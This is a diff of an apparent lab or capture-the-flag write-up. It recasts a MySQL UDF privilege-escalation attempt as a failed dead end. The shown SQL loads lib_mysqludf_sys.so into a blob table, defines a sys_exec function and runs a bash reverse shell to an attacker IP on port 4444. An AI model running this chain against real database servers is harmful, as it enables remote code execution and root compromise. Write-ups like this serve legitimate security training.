@@ -1563,11 +1563,10 @@ a4 OK Fetch completed.
 
 
 
+### Failed Attempts
+#### Get Root from MySQL - A Dead End
 
-
-![[Pasted image 20240511182840.png]]
-
-I followed [this article on Medium](https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b) to upload the [lib_mysqludf_sys.so](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64) file as [blob](https://www.mysqltutorial.org/mysql-basics/mysql-blob) in a table to open a file in the `mysql` library (however our `mysql` user has no permissions to write in the directory `/usr/lib/mysql/plugin`) and be able to [create a function](https://dev.mysql.com/doc/refman/8.0/en/create-function-loadable.html).
+According to [this article on Medium](https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b), a possibility would have been to inject the [lib_mysqludf_sys.so](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64) file as [blob](https://www.mysqltutorial.org/mysql-basics/mysql-blob) in a table to open a file in the `mysql` library in order to be able to [create a function](https://dev.mysql.com/doc/refman/8.0/en/create-function-loadable.html) allowing us to open a shell as user `root`. Unluckily, however, our `mysql` user has no permissions to write in the directory `/usr/lib/mysql/plugin`.
 
 We transfer the file to the `/tmp` directory of the host machine:
 ```shell
@@ -1587,12 +1586,12 @@ lib_mysqludf_sys.so                                                             
 ┌──(fab㉿kali)-[~]
 └─$
 ```
-and insert the following code in the "SQL" tab of PHPMyAdmin:
+Them we open a listener and insert the following code in the "SQL" tab of PHPMyAdmin:
 ```
 use mysql;
-create table flash (line blob);
-insert into flash values(load_file('/tmp/lib_mysqludf_sys.so'));
-select * from flash into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+create table carrot (line blob);
+insert into carrot values(load_file('/tmp/lib_mysqludf_sys.so'));
+select * from carrot into dumpfile '/usr/lib/mysql/lib_mysqludf_sys.so';
 create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
 select sys_exec('bash -i >& /dev/tcp/192.168.119.135/4444 0>&1');
 ```
